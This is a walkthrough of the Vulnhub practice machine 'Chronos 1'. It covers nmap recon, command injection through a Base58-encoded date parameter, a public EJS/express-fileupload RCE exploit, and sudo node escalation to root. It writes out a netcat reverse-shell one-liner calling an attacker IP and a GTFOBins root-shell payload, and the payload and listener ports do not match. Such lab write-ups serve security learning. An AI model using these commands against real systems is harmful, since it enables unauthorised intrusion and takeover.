# Chronos 1 | Vulnhub | Walkthrough

| Category          | Details               |
|----------         |---------              |
| Platform          | [Chronos 1](https://www.vulnhub.com/entry/chronos-1,735/)              |
| Difficulty        | easy                  |
| Target machine    | Linux                 |
| Attacker Machine  | Kali linux            |
| Tools             | nmap, Burp Suite, Gtfobins  |

# Reconnaissance
First, identify the target machine's IP address on the local network using arp-scan.

[arp-scan](../Vulnhub/images/chronos/image.png)

IP:- 10.0.2.20<br>
Next, perform an Nmap scan to enumerate open ports and running services.<br>
`nmap -A -T4 <ip address>`

[Nmap Scan](../Vulnhub/images/chronos/image-1.png)

The scan reveals the following services:
| Port      | Service       |
| --------- |---------------|
| 22/tcp    | ssh           |
| 80/tcp    | http          |
| 8000/tcp  | http          |

Browse to the HTTP service to inspect the web application.

[Webpage](../Vulnhub/images/chronos/image-2.png)

# Enumeration
The homepage appears to be a simple static page with no immediately interesting functionality.<br>
Inspecting the page source reveals additional information.

[Source code](../Vulnhub/images/chronos/image-3.png)

The source code discloses a hostname and an additional endpoint.<br>
Add the discovered hostname to `/etc/hosts` and revisit the application.

[webpage_2](../Vulnhub/images/chronos/image-4.png)

let’s run the url we found in the source code

[webpage_3](../Vulnhub/images/chronos/image-5.png)

Accessing chronos.local or chronos.local:8000 displays the current date and time.<br>
However, accessing the endpoint referenced in the source code returns a "Permission Denied" message, indicating additional logic behind the format parameter.<br>
http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL<br>
Let's investigate the format parameter to understand how it is processed.

[chiper decrypt](../Vulnhub/images/chronos/image-6.png)

[chiper decrypt](../Vulnhub/images/chronos/image-7.png)

Using a cipher identification tool reveals that the parameter is Base58-encoded.<br>
Decoding the value shows that it corresponds to an argument passed to the Linux `date` command.<br>

[Linux commands](../Vulnhub/images/chronos/image-8.png)

# Exploitation
This suggests that the application invokes the date command on the server and returns its output to the client.<br>
To verify whether the parameter is vulnerable to command injection, intercept the request using Burp Suite.
- Intercept chronos.local request and send it to the repeater
- send the request to make sure you have a status code 200
- Replace the decoded +today argument with +hello, re-encode it in Base58, and resend the request.

[testing](../Vulnhub/images/chronos/image-9.png)

[burp suite testing](../Vulnhub/images/chronos/image-10.png)

The modified response reflects the injected value, confirming that user input is being passed directly to the underlying command. This behavior indicates a command injection vulnerability that can be leveraged to execute a reverse shell.
 
[Reverse Shell Cheat Sheet | Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) Get the Netcat payload from here
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP-address 1234 >/tmp/f
```
Encode the reverse shell payload using Base58 before including it in the request. 

[cyber chef](../Vulnhub/images/chronos/image-11.png)

Start a Netcat listener on the attack machine: `nc -lvp 4444` <br>
Replace the original parameter with the encoded payload and send the request.

[burp suite](../Vulnhub/images/chronos/image-12.png)

# Initial Access

Upon successful exploitation, a reverse shell is established on the target.<br>
The initial shell may be unstable or lack interactive features. Upgrade it using Python:
```
run python3 -c 'import pty;pty.spawn("/bin/bash")'
```

[Reverse shell](../Vulnhub/images/chronos/image-13.png)

# Privilege escalation

While enumerating the filesystem, the `/opt` directory contains another web application named `chronos-v2`. Further inspection reveals that it uses a vulnerable version of `express-fileupload`, which is susceptible to remote code execution.

A public proof-of-concept exploit is available for this vulnerability and can be used to obtain code execution. [script](https://github.com/boiledsteak/EJS-Exploit/blob/main/attacker/EJS-RCE-attack.py)

[target files](../Vulnhub/images/chronos/image-14.png)

Before execution, modify the exploit configuration as required.<br>
[exploit.py](../Vulnhub/images/chronos/image-15.png)

Update the payload to use the attacker's IP address and listening port.
Start a listener on the attack machine and execute the exploit.
```
python3 EJS-RCE-attack.py
```

[imera shell](../Vulnhub/images/chronos/image-16.png)

The exploit successfully returns a shell as the `imera` user.<br>

## Root Access Escalation
Enumerate the `sudo` privileges available to the `imera` user.

[sudo -l](../Vulnhub/images/chronos/image-17.png)

The output shows that imera can execute both npm and node with elevated privileges.<br>
Whenever sudo permissions allow execution of common Unix binaries, consulting GTFOBins is a good practice to identify potential privilege escalation techniques.<br>
GTFOBins provides the following payload for spawning a privileged shell via node:
```
node -e ‘require(“child_process”).spawn(“/bin/sh”, {stdio: [0, 1, 2]})’
```

[GTFobins](../Vulnhub/images/chronos/image-18.png)

[root access](../Vulnhub/images/chronos/image-19.png)

<b>Executing the payload yields an interactive root shell.</b>

[user flag](../Vulnhub/images/chronos/image-21.png)

[root flag](../Vulnhub/images/chronos/image-20.png)

Root flag & User Flag found!<br>
I hope this walkthrough was clear, informative, and easy to follow.<br>

Happy Hacking ~!!!
